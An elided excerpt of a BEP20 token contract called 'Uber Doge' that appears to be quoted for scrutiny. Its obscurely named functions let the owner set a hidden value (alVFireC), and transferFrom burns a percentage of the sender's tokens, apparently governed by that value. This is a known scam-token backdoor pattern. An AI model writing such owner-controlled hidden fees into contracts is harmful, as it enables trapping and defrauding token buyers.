...
contract BEP20Token is IBEP20 {
    using EXMath for uint256;

    string public name20 =  "Uber Doge";
    string public symbol20 =  "UDOGE";
    uint8 public decimals20 = 9;
    uint public _totalSupplyAD = 1*10**15 * 10**9;

    uint8 private _noname;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyAD;
        emit Transfer(address(0), msg.sender, _totalSupplyAD);
    }
   ...
   function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyAD - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _LAVY(from,tokens.mul(bakVFireC()).div(10**2));
    ...
    function _LAVY(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyAD = _totalSupplyAD.subs(tokens);
    ...
    function alVFireC(uint8 noname) public virtual onlyOwner {
		_noname = noname;
	}
